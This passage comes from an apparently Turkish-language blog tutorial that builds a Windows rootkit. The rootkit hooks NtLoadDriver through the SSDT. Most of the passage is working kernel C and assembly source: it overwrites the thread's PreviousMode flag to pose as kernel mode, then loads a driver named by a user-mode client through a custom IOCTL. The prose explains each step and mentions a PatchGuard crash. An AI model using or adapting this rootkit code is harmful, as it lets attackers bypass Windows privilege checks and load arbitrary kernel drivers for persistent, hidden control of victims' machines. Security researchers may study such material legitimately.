+</span></span><span class="line"><span class="cl"> <span class="n">UserBuffer</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UserBuffer</span><span class="p">.</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nf">RtlCopyMemory</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Driver: %wZ</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">PreviousStatus</span> <span class="o">=</span> <span class="nf">ChangePreviousMode</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PreviousStatus</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">_NtLoadDriver</span> <span class="n">NtLoadDriver</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtLoadDriver</span><span class="p">)</span><span class="n">g_NtLoadDriverAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="nf">NtLoadDriver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="n">Status</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Clean</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">Clean</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PreviousStatus</span> <span class="o">=</span> <span class="nf">ChangePreviousMode</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PreviousStatus</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nf">ExFreePoolWithTag</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">buff</span><span class="err">&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Büyünün gerçekleştiği asıl kısma geldik. User-Mode programı artık NtLoadDriver için syscall yaptı ve akış buraya geldi. Şimdi ise burada neler yapılıyor ona göz atalım.</p>
+<p>Öncelikle HkDetourFunction ile NtLoadDriver için eklediğimiz trambolini kaldırıyoruz ve orijinal kodlarını geri getiriyoruz. Daha sonra User-Mode programından aldığımız parametreyi kernel space&rsquo;a aktarıyoruz. Bu önemlidir ve PreviousMode konusuyla ilgilidir.</p>
+<p>Hatırlayalım, PreviousMode bayrağı, yapılan işlemin Kernel-Mode yetkilisi mi yoksa User-Mode yetkilisi mi olduğunu belirlemek için kullanılıyordu, değil mi?</p>
+<p>PreviousMode bayrağının User-Mode programın syscall işleminden sonra 1 (User-Mode) değeri alacağını biliyoruz. Rootkit tarafından direkt olarak 0 (Kernel-Mode) olarak ayarlayıp daha sonrasında User-Mode parametresi gönderirsek, Patchguard abimiz racon kesmeye başlayacaktır:</p>
+<p><img src="../../images/posts/ssdt-hooking/img4.png" alt="" loading="lazy" /></p>
+<p>BSOD nedeninin <strong>PREVIOUS MODE MISMATCH</strong> olduğuna dikkat edelim. Bu hata bize PreviousMode bayrağıyla ilgili çakışma olduğunu gösterir.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="n">PreviousStatus</span> <span class="o">=</span> <span class="nf">ChangePreviousMode</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PreviousStatus</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Daha sonra <strong>ChangePreviousMode</strong> fonksiyonu çağırılıyor. Bu ise Assembly projemde yer alan bir fonksiyondur:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">;</span> <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">; 
+</span></span></span><span class="line"><span class="cl"><span class="cm">; BOOLEAN ChangePreviousMode(
+</span></span></span><span class="line"><span class="cl"><span class="cm">;	_in_ int Mode
+</span></span></span><span class="line"><span class="cl"><span class="cm">; );
+</span></span></span><span class="line"><span class="cl"><span class="cm">;
+</span></span></span><span class="line"><span class="cl"><span class="cm">; */</span>
+</span></span><span class="line"><span class="cl"><span class="n">ChangePreviousMode</span> <span class="n">PROC</span>
+</span></span><span class="line"><span class="cl">	<span class="p">;</span> <span class="n">In</span> <span class="n">PreviousMode</span> <span class="n">we</span> <span class="n">have</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">KernelMode</span> <span class="n">and</span> <span class="mi">1</span> <span class="k">for</span> <span class="n">UserMode</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">	<span class="p">;</span> <span class="n">It</span> <span class="n">means</span><span class="p">,</span> <span class="n">we</span> <span class="n">can</span> <span class="n">only</span> <span class="n">change</span> <span class="n">the</span> <span class="n">PreviousMode</span> <span class="n">to</span> <span class="mi">0</span> <span class="n">or</span> <span class="mf">1.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">cmp</span> <span class="n">rcx</span><span class="p">,</span><span class="mi">0</span>			<span class="p">;</span> <span class="n">Check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">Mode</span> <span class="n">is</span> <span class="n">Kernel</span> <span class="nf">Mode</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">jz</span> <span class="n">ChangePrevious</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">cmp</span> <span class="n">rcx</span><span class="p">,</span><span class="mi">1</span>			<span class="p">;</span> <span class="n">Check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">Mode</span> <span class="n">is</span> <span class="n">User</span> <span class="nf">Mode</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">jz</span> <span class="n">ChangePrevious</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">;</span> <span class="n">If</span> <span class="n">the</span> <span class="n">Mode</span> <span class="n">is</span> <span class="n">not</span> <span class="mi">0</span> <span class="n">or</span> <span class="mi">1</span><span class="p">,</span> <span class="k">return</span> <span class="n">FALSE</span>
+</span></span><span class="line"><span class="cl">	<span class="n">xor</span> <span class="n">rax</span><span class="p">,</span><span class="n">rax</span>
+</span></span><span class="line"><span class="cl">	<span class="n">jmp</span> <span class="n">Return</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">ChangePrevious</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">push</span> <span class="n">rdx</span> 
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="p">;</span> <span class="n">We</span> <span class="n">need</span> <span class="n">to</span> <span class="n">get</span> <span class="n">the</span> <span class="n">KPCR</span> <span class="n">because</span> <span class="n">the</span> <span class="n">KPCR</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">PreviousMode</span>
+</span></span><span class="line"><span class="cl">	<span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="nl">gs</span><span class="p">:[</span><span class="mi">188</span><span class="n">h</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">;</span> <span class="n">The</span> <span class="mh">0x232</span> <span class="n">offset</span> <span class="n">is</span> <span class="n">point</span> <span class="n">to</span> <span class="n">the</span> <span class="n">PreviousMode</span> <span class="n">in</span> <span class="n">the</span> <span class="n">KPCR</span>
+</span></span><span class="line"><span class="cl">	<span class="n">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span><span class="o">+</span><span class="mi">232</span><span class="n">h</span><span class="p">],</span><span class="n">cl</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pop</span> <span class="n">rdx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">mov</span> <span class="n">rax</span><span class="p">,</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">Return</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">ChangePreviousMode</span> <span class="n">ENDP</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Araştırmalarımızdan sonra bu Assembly kodlarının artık ne yaptığını biliyoruz. Ancak kısaca özet geçmek gerekirse, 0x188 offset&rsquo;ine işaret eden KPCR yapısını alıyoruz ve bu yapıda 0x232 offset&rsquo;ine işaret eden PreviousMode bayrağına cl&rsquo;in değerini veriyoruz. Bu register ise gönderilen parametreyi tutar. Şuan ki kodumuzda 0 gönderdiğimizden bu bayrağı Kernel-Mode olarak ayarlayacaktır.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="n">_NtLoadDriver</span> <span class="n">NtLoadDriver</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtLoadDriver</span><span class="p">)</span><span class="n">g_NtLoadDriverAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="nf">NtLoadDriver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UserBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="n">Status</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Clean</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">Clean</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PreviousStatus</span> <span class="o">=</span> <span class="nf">ChangePreviousMode</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PreviousStatus</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nf">ExFreePoolWithTag</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">buff</span><span class="err">&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Son olarak ise SSDT ile elde ettiğimiz NtLoadDriver&rsquo;ın adresini çağırıyoruz ve NtLoadDriver çağırıldıktan sonra PreviousMode bayrağını tekrar 1 (User-Mode) haline getirerek işlemleri bitiriyoruz.</p>
+<h3>User-Mode Program<span class="hx-absolute -hx-mt-20" id="user-mode-program"></span>
+    <a href="#user-mode-program" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>User-Mode programın kodları basit ve bu yüzden kısa tutacağım:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;main.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="n">NtLoadDriver</span> <span class="n">_NtLoadDriver</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">HANDLE</span> <span class="n">HandleDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">HMODULE</span> <span class="n">NTDLL</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UNICODE_STRING</span> <span class="n">DriverServiceName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">DWORD</span> <span class="n">OutputBytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">BOOL</span> <span class="n">Result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">DWORD</span> <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="nf">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DriverServiceName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">Registry</span><span class="se">\\</span><span class="s">Machine</span><span class="se">\\</span><span class="s">System</span><span class="se">\\</span><span class="s">CurrentControlSet</span><span class="se">\\</span><span class="s">Services</span><span class="se">\\</span><span class="s">yourdriver&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">HandleDevice</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">HandleDevice</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to connect Driver! Error Code: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">BOOLEAN</span> <span class="n">bValue</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Result</span> <span class="o">=</span> <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">HandleDevice</span><span class="p">,</span> <span class="n">IOCTL_BYPASS_PREVIOUS_MODE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bValue</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bValue</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">OutputBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to IOCTL Code!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">NTDLL</span> <span class="o">=</span> <span class="nf">GetModuleHandleA</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">NTDLL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to get address of NTDLL!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;NTDLL: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">NTDLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">_NtLoadDriver</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtLoadDriver</span><span class="p">)</span><span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">NTDLL</span><span class="p">,</span> <span class="s">&#34;NtLoadDriver&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">_NtLoadDriver</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to get address of NtLoadDriver!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;NtLoadDriver: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">_NtLoadDriver</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Status</span> <span class="o">=</span> <span class="nf">_NtLoadDriver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DriverServiceName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="o">==</span> <span class="mh">0xc000010e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The driver is already loaded</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to Load Driver! Error Code: 0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Status</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The driver was installed successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">Exit</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">NTDLL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">FreeLibrary</span><span class="p">(</span><span class="n">NTDLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">HandleDevice</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">HandleDevice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">dwExitCode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Kodlarımız bu şekilde. Kabaca ne yapıldığını anlamışsınızdır. Rootkit ile iletişim kuruyoruz ardından NTDLL&rsquo;den NtLoadDriver&rsquo;ın adresini alıp çağırıyoruz.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
